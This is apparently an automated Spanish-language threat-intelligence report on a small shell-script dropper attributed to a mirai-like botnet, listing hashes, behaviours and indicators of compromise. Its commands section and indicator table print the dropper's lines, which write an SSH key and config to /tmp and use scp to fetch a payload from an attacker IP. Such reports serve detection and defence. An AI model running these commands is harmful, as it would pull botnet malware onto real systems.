# 🧬 Payload Analysis

`9b5d73ae1ae2bb3927f47a2d6078bdc26c66f075ec8681add3ec81e3c18cc258`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos, Ejecución. Se identificaron 2 comandos observados o extraídos. Se identificaron 6 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:36:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9b5d73ae1ae2bb3927f47a2d6078bdc26c66f075ec8681add3ec81e3c18cc258`
- **MD5:** `9b0f57e97eb6becf374feed0be8b106e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (323), with CRLF, LF line terminators |
| Tamaño | 930 B |
| Entropía | 5.85 |
| Strings | 11 |

## 🧠 Comportamiento observado

1. **Cambio de permisos**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (323), with CRLF, LF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX:sh out_sh; if [ $
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 217.60.195.XXX | static_analysis |
| command | cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY----- | strings |
| command | UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX:sh out_sh; if [ $ | strings |
| hash | 9b5d73ae1ae2bb3927f47a2d6078bdc26c66f075ec8681add3ec81e3c18cc258 | static_analysis |
| ip | 144.31.156.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
